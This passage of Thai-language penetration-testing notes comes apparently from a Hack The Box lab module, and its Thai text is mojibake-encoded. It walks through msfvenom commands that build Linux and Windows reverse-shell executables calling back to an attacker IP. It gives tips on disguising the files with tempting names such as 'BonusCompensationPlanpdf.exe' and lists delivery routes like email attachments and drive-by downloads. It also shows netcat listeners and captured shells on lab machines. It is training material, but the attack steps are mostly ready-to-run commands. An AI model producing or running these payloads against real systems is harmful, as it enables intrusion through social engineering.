| `linux/x64/shell_reverse_tcp` | Linux 64-bit stageless payload ‡∏ó‡∏µ‡πà‡∏à‡∏∞‡∏™‡∏£‡πâ‡∏≤‡∏á TCP reverse shell |
| `LHOST=10.10.14.113` | IP address ‡∏Ç‡∏≠‡∏á‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡πÇ‡∏à‡∏°‡∏ï‡∏µ‡∏ó‡∏µ‡πà‡∏à‡∏∞‡∏£‡∏±‡∏ö‡∏Å‡∏≤‡∏£‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠ |
| `LPORT=443` | Port ‡∏ó‡∏µ‡πà‡∏à‡∏∞‡∏£‡∏±‡∏ö‡∏Å‡∏≤‡∏£‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠ |
| `-f elf` | ‡∏£‡∏π‡∏õ‡πÅ‡∏ö‡∏ö‡∏Ç‡∏≠‡∏á‡πÑ‡∏ü‡∏•‡πå‡∏ó‡∏µ‡πà‡∏à‡∏∞‡∏™‡∏£‡πâ‡∏≤‡∏á = `.elf` (Linux executable) |
| `> createbackup.elf` | ‡∏ä‡∏∑‡πà‡∏≠‡πÑ‡∏ü‡∏•‡πå output |

### ‡πÄ‡∏Ñ‡∏•‡πá‡∏î‡∏•‡∏±‡∏ö‡∏Å‡∏≤‡∏£‡∏ï‡∏±‡πâ‡∏á‡∏ä‡∏∑‡πà‡∏≠‡πÑ‡∏ü‡∏•‡πå:

**‡∏ï‡∏±‡πâ‡∏á‡∏ä‡∏∑‡πà‡∏≠‡πÉ‡∏´‡πâ:**
- ‡πÑ‡∏°‡πà‡∏ô‡πà‡∏≤‡∏™‡∏á‡∏™‡∏±‡∏¢ (inconspicuous)
- ‡∏î‡∏π‡∏ô‡πà‡∏≤‡∏™‡∏ô‡πÉ‡∏à/‡∏à‡∏π‡∏á‡πÉ‡∏à‡πÉ‡∏´‡πâ‡∏î‡∏≤‡∏ß‡∏ô‡πå‡πÇ‡∏´‡∏•‡∏î‡πÅ‡∏•‡∏∞‡∏£‡∏±‡∏ô
- **‡∏ï‡∏±‡∏ß‡∏≠‡∏¢‡πà‡∏≤‡∏á:** `createbackup.elf`, `system_update.elf`, `important_document.elf`

---

## ‡∏ß‡∏¥‡∏ò‡∏µ‡∏™‡πà‡∏á Payload ‡πÑ‡∏õ‡∏¢‡∏±‡∏á‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢

### ‡∏ä‡πà‡∏≠‡∏á‡∏ó‡∏≤‡∏á‡∏ó‡∏µ‡πà‡∏ô‡∏¥‡∏¢‡∏°‡πÉ‡∏ä‡πâ:

**1. Email:**
- ‡πÅ‡∏ô‡∏ö‡πÑ‡∏ü‡∏•‡πå‡πÉ‡∏ô‡∏≠‡∏µ‡πÄ‡∏°‡∏•
- Social engineering

**2. Website:**
- ‡∏•‡∏¥‡∏á‡∏Å‡πå‡∏î‡∏≤‡∏ß‡∏ô‡πå‡πÇ‡∏´‡∏•‡∏î‡∏ö‡∏ô‡πÄ‡∏ß‡πá‡∏ö‡πÑ‡∏ã‡∏ï‡πå
- Drive-by download

**3. Metasploit Exploit Module:**
- ‡πÉ‡∏ä‡πâ‡∏£‡πà‡∏ß‡∏°‡∏Å‡∏±‡∏ö exploit module
- ‡∏ï‡πâ‡∏≠‡∏á‡∏≠‡∏¢‡∏π‡πà‡πÉ‡∏ô‡πÄ‡∏Ñ‡∏£‡∏∑‡∏≠‡∏Ç‡πà‡∏≤‡∏¢‡∏†‡∏≤‡∏¢‡πÉ‡∏ô‡πÅ‡∏•‡πâ‡∏ß

**4. Physical Access:**
- Flash drive
- ‡∏™‡πà‡∏ß‡∏ô‡∏´‡∏ô‡∏∂‡πà‡∏á‡∏Ç‡∏≠‡∏á onsite penetration test

**5. ‡∏≠‡∏∑‡πà‡∏ô‡πÜ:**
- File sharing services
- Messaging apps
- Remote desktop

---

## ‡∏Å‡∏≤‡∏£‡∏£‡∏±‡∏ô Payload ‡∏ö‡∏ô Linux

### ‡∏™‡∏ñ‡∏≤‡∏ô‡∏Å‡∏≤‡∏£‡∏ì‡πå‡∏ï‡∏±‡∏ß‡∏≠‡∏¢‡πà‡∏≤‡∏á:

**‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢:**
- Ubuntu box ‡∏ó‡∏µ‡πà IT admin ‡πÉ‡∏ä‡πâ
- ‡πÉ‡∏ä‡πâ‡∏à‡∏±‡∏î‡∏Å‡∏≤‡∏£ network devices
- ‡πÄ‡∏Å‡πá‡∏ö configuration scripts
- ‡πÄ‡∏Ç‡πâ‡∏≤‡∏ñ‡∏∂‡∏á routers & switches

**‡∏ß‡∏¥‡∏ò‡∏µ‡πÇ‡∏à‡∏°‡∏ï‡∏µ:**
- ‡∏™‡πà‡∏á‡∏≠‡∏µ‡πÄ‡∏°‡∏•‡∏û‡∏£‡πâ‡∏≠‡∏°‡πÑ‡∏ü‡∏•‡πå‡πÅ‡∏ô‡∏ö
- Admin ‡πÉ‡∏ä‡πâ‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡∏ô‡∏µ‡πâ‡πÄ‡∏´‡∏°‡∏∑‡∏≠‡∏ô‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡∏™‡πà‡∏ß‡∏ô‡∏ï‡∏±‡∏ß (‡∏õ‡∏£‡∏∞‡∏°‡∏≤‡∏ó)
- Admin ‡∏Ñ‡∏•‡∏¥‡∏Å‡πÑ‡∏ü‡∏•‡πå

### ‡πÄ‡∏ï‡∏£‡∏µ‡∏¢‡∏° Listener

```bash
sudo nc -lvnp 443
```

### ‡πÄ‡∏°‡∏∑‡πà‡∏≠‡πÄ‡∏´‡∏¢‡∏∑‡πà‡∏≠‡∏£‡∏±‡∏ô‡πÑ‡∏ü‡∏•‡πå:

```bash
sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.138.85 60892
env
PWD=/home/htb-student/Downloads
cd ..
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
```

**‚úÖ ‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à!** ‡πÑ‡∏î‡πâ shell ‡πÅ‡∏•‡πâ‡∏ß

---

## ‡∏™‡∏£‡πâ‡∏≤‡∏á Payload ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö Windows

### ‡∏™‡∏£‡πâ‡∏≤‡∏á Windows Executable

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

**Output:**
```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

### ‡∏Å‡∏≤‡∏£‡πÅ‡∏¢‡∏Å‡∏ß‡∏¥‡πÄ‡∏Ñ‡∏£‡∏≤‡∏∞‡∏´‡πå‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á:

| ‡∏™‡πà‡∏ß‡∏ô | ‡∏Ñ‡∏ß‡∏≤‡∏°‡∏´‡∏°‡∏≤‡∏¢ |
|------|----------|
| `windows/shell_reverse_tcp` | Windows stageless reverse TCP shell payload |
| `-f exe` | ‡∏£‡∏π‡∏õ‡πÅ‡∏ö‡∏ö‡πÑ‡∏ü‡∏•‡πå = `.exe` (Windows executable) |
| `BonusCompensationPlanpdf.exe` | ‡∏ä‡∏∑‡πà‡∏≠‡πÑ‡∏ü‡∏•‡πå‡∏ó‡∏µ‡πà‡∏î‡∏π "‡∏ô‡πà‡∏≤‡∏™‡∏ô‡πÉ‡∏à" ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö social engineering |

### ‡∏´‡∏°‡∏≤‡∏¢‡πÄ‡∏´‡∏ï‡∏∏‡∏™‡∏≥‡∏Ñ‡∏±‡∏ç:

**‚ö†Ô∏è ‡∏õ‡∏±‡∏ç‡∏´‡∏≤ Windows Defender:**
- Payload ‡πÅ‡∏ö‡∏ö‡∏ô‡∏µ‡πâ (‡πÑ‡∏°‡πà‡∏°‡∏µ encoding/encryption) ‡∏à‡∏∞**‡∏ñ‡∏π‡∏Å Windows Defender ‡∏à‡∏±‡∏ö‡πÑ‡∏î‡πâ‡πÅ‡∏ô‡πà‡∏ô‡∏≠‡∏ô**
- ‡∏ï‡πâ‡∏≠‡∏á‡πÉ‡∏ä‡πâ‡πÄ‡∏ó‡∏Ñ‡∏ô‡∏¥‡∏Ñ evasion ‡πÄ‡∏û‡∏¥‡πà‡∏°‡πÄ‡∏ï‡∏¥‡∏° (‡∏à‡∏∞‡πÄ‡∏£‡∏µ‡∏¢‡∏ô‡πÉ‡∏ô‡∏´‡∏±‡∏ß‡∏Ç‡πâ‡∏≠‡∏ñ‡∏±‡∏î‡πÑ‡∏õ)

---

## ‡∏Å‡∏≤‡∏£‡∏£‡∏±‡∏ô Payload ‡∏ö‡∏ô Windows

### ‡∏™‡∏ñ‡∏≤‡∏ô‡∏Å‡∏≤‡∏£‡∏ì‡πå:

1. ‡∏™‡πà‡∏á payload ‡πÑ‡∏õ‡∏¢‡∏±‡∏á‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢
2. ‡πÄ‡∏´‡∏¢‡∏∑‡πà‡∏≠‡∏î‡∏±‡∏ö AV (‡∏´‡∏£‡∏∑‡∏≠‡πÉ‡∏ä‡πâ evasion techniques)
3. ‡πÄ‡∏´‡∏¢‡∏∑‡πà‡∏≠‡∏î‡∏±‡∏ö‡πÄ‡∏ö‡∏¥‡∏•‡∏Ñ‡∏•‡∏¥‡∏Å‡πÑ‡∏ü‡∏•‡πå

### ‡πÄ‡∏ï‡∏£‡∏µ‡∏¢‡∏° Listener

```bash
sudo nc -lvnp 443
```

### ‡πÄ‡∏°‡∏∑‡πà‡∏≠‡πÄ‡∏´‡∏¢‡∏∑‡πà‡∏≠‡∏£‡∏±‡∏ô‡πÑ‡∏ü‡∏•‡πå:

```bash
sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.144.5 49679
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\htb-student\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is DD25-26EB

 Directory of C:\Users\htb-student\Downloads

09/23/2021  10:26 AM    <DIR>          .
09/23/2021  10:26 AM    <DIR>          ..
09/23/2021  10:26 AM            73,802 BonusCompensationPlanpdf.exe
               1 File(s)         73,802 bytes
               2 Dir(s)   9,997,516,800 bytes free
```

**‚úÖ ‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à!** ‡πÑ‡∏î‡πâ Windows shell ‡πÅ‡∏•‡πâ‡∏ß

---

